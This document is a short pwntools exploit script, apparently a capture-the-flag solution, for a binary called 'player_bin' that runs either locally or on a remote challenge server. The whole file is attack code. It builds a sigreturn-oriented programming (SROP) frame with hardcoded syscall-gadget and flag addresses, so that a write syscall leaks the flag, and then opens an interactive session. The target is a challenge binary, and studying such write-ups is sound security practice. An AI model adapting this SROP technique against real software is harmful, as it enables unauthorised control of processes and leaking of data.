#!/usr/bin/env python2

from pwn import *
import time

HOST = '163.172.176.29'
PORT = 9034

local = True
#local = False

context.arch = "amd64"
context.log_level = 'debug'
elf = ELF("./player_bin")

if local:
    conn = process("./player_bin")
    gdb.attach(conn)
else:
    conn = remote(HOST, PORT)

frame = SigreturnFrame()
frame.rax = constants.SYS_write
frame.rdi = constants.STDOUT_FILENO
frame.rsi = 0x10000023 #flag string address
frame.rdx = 50 #read size
frame.rsp = 0xABADCAFE
frame.rip = 0x10000015 #syscall gadget

conn.send(str(frame))
print conn.recvall()

conn.interactive()
